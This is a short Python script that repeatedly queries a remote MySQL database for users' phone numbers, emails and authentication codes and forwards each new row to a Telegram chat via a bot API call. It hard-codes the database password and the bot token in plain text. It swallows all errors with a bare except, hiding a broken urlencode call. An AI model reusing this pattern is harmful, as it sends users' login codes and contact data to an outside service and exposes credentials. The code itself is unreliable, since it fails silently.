#!/usr/bin/env python
import urllib.request
import time
import mysql.connector
import urllib.request
from datetime import datetime


if __name__ == "__main__":
    temp_list = []

    while(not time.sleep(5)):
        try:
            if datetime.utcnow().strftime("%H:%M") == "23:59":
                break
            mydb = mysql.connector.connect(
            host="mbc.filmus.online",
            user="MediseenBD",
            password="ZAQ!2wsx",
            database="MediseenDB"
            )
            cursor = mydb.cursor()
            cursor.execute('SELECT PhoneNumber, Email, AuthCode FROM Users WHERE AuthCode is not NULL && AuthCode <> ""')
            result = cursor.fetchall()

            for x in result:
                values = urllib.parse.urlencode(' '.join(str(e) for e in x))
                if values not in temp_list:
                    temp_list.append(values)
                    urllib.request.urlopen("https://api.telegram.org/bot343228570:AAHWvNfSyL-O5QgnkQXWK7DDTWL70_XHTcw/sendMessage?chat_id=-660618667&text=%s" % values)
        except:
            pass